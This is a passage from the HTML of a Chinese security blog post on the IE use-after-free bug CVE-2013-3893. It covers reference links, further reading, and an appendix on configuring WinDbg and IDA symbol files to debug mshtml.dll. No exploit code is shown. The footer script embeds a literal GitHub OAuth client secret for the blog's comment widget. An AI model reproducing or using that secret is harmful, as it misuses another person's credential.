+<p>[4]Geek青松.(<a href="https://me.csdn.net/u010142102).CVE-2013-3893" target="_blank" rel="noopener">https://me.csdn.net/u010142102).CVE-2013-3893</a> IE浏览器UAF漏洞分析[DB/OL]。<a href="https://blog.csdn.net/u010142102/article/details/89207164,2019-04-11" target="_blank" rel="noopener">https://blog.csdn.net/u010142102/article/details/89207164,2019-04-11</a></p>
+<p>[5]luobobo.CVE-2013-3893 详细分析[DB/OL].<a href="https://bbs.pediy.com/thread-226879.htm,2018-5-19" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226879.htm,2018-5-19</a></p>
+<p>扩展阅读</p>
+<p>Crash和利用分析可以看这篇</p>
+<p><a href="http://www.freesion.com/article/137468367/" target="_blank" rel="noopener">http://www.freesion.com/article/137468367/</a></p>
+<p><a href="https://www.cnblogs.com/wal613/p/3887719.html" target="_blank" rel="noopener">https://www.cnblogs.com/wal613/p/3887719.html</a></p>
+<p>IE浏览器安全</p>
+<p><a href="https://www.infoq.cn/article/Internet-Explorer-Security1/" target="_blank" rel="noopener">https://www.infoq.cn/article/Internet-Explorer-Security1/</a></p>
+<p><a href="https://www.infoq.cn/article/InternetExplorer-Security2/" target="_blank" rel="noopener">https://www.infoq.cn/article/InternetExplorer-Security2/</a></p>
+<p><a href="https://www.anquanke.com/post/id/187650" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187650</a></p>
+<p>Pwnable-UAF</p>
+<p><a href="https://cloud.tencent.com/developer/article/1345751" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1345751</a></p>
+<p>浏览器运行原理（推荐）</p>
+<p><a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#1_1" target="_blank" rel="noopener">https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#1_1</a></p>
+<p>0x9A82师傅写的都是精品</p>
+<p><a href="https://www.cnblogs.com/Ox9A82/p/5320857.html" target="_blank" rel="noopener">UAF漏洞学习</a></p>
+<p><a href="https://www.cnblogs.com/Ox9A82/p/5320857.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ox9A82/p/5320857.html</a></p>
+<p><a href="https://www.cnblogs.com/Ox9A82/p/5782425.html" target="_blank" rel="noopener">IE漏洞的调试心得</a></p>
+<p><a href="https://www.cnblogs.com/Ox9A82/p/5782425.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ox9A82/p/5782425.html</a></p>
+<p><a href="https://www.cnblogs.com/Ox9A82/p/5797123.html" target="_blank" rel="noopener">CVE-2013-3893</a></p>
+<p><a href="https://www.cnblogs.com/Ox9A82/p/5797123.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ox9A82/p/5797123.html</a></p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>Windbg符号表设置</p>
+<p>符号表设置在调试IE漏洞中非常重要，没有符号表调试过程就像盲人摸象，在Windbg中设置符号地址为</p>
+<p>SRV<em>c:\Symbols</em><a href="http://msdl.microsoft.com/download/symbols" target="_blank" rel="noopener">http://msdl.microsoft.com/download/symbols</a></p>
+<p>&gt;.reload 重新载入符号表</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARId1.png" alt=""> </p>
+<p>如果载入出现问题，可以执行!sym noisy之后再进行reload，windbg会打印符号表载入细节。例如这里可以看的处是微软符号服务器的问题，无法下载对应PDB文件。如果是winxp系统，则是微软已经关闭了服务，无法通过这种方法下载。如果是win7及以上，可能是服务器抽风了，检查一下这个网站是否可以访问，多试几次一般就行了。</p>
+<p>当初安装时候以为WIN7的符号表也和WinXP一样一声不响地关闭了，前两天还给Vista下载了符号表，然后这两天忽然就不行。不过到了第二天，忽然又可以载入符号表了，听大佬说到明年WIN7才会停止支持。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARoIx.png" alt="img"> </p>
+<p>对于winxp，因为符号包弃用，只能去下载别人的符号表。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAR7i6.png" alt="img"> </p>
+<p>.reload -f mshtml.dll下载mshtml.dll的符号表（pdb文件）。我们都知道mshtml是IE浏览器的用于解析页面最重要的组件。</p>
+<p>然后就可以下断点了。调试IE如果没有符号表基本就没有办法好好调试了。</p>
+<p>可以使用x 搜索mshtml中的函数进行下断点。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARHJK.png" alt="img"> </p>
+<p>IDA符号表设置</p>
+<p>我们还可以将符号表加载到IDA，这样反汇编mshtml.dll时里面的函数就会真正拥有它本来的姓名，而不是sub_xxx的名称。</p>
+<p>使用file-load file-PDB file就能加载符号表了。当然还是建议在mshtml本地环境（我这里是WIn7 SP1）安装一个IDA pro6.8，这样也会少去了很多步骤。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARbRO.png" alt="img"> </p>
+<p>加载符号表之前</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARqzD.png" alt="img"> </p>
+<p>加载符号表之后</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAROQe.png" alt="img"> </p>
+<p>符号表的一些参考文献：</p>
+<p><a href="https://stackoverflow.com/questions/4828583/error-symbol-file-could-not-be-found-windbg-exe" target="_blank" rel="noopener">https://stackoverflow.com/questions/4828583/error-symbol-file-could-not-be-found-windbg-exe</a></p>
+<p><a href="https://www.wintellect.com/the-secret-to-avoiding-debugger-slowdowns/" target="_blank" rel="noopener">https://www.wintellect.com/the-secret-to-avoiding-debugger-slowdowns/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/" data-id="ck4pciqof002mvx2seej4b45m"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/" rel="tag">Exploit</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/11/12/Three-Write/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            红帽杯PWN题-Three 解析
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/10/26/Gusubei/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">从东南到东南 --姑苏杯信安大赛小记</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '5ae4e05700db25ed5406',
+      clientSecret: '8a38a8cb845b0b6198a0c59cab9df498ac778343',
+      repo: 'migraine-sudo.github.io',
+      owner: 'migraine-sudo',
+      admin: ['migraine-sudo'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 Migraine</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/fujiang.jpg" alt="Migraine"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/tags">Tags</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
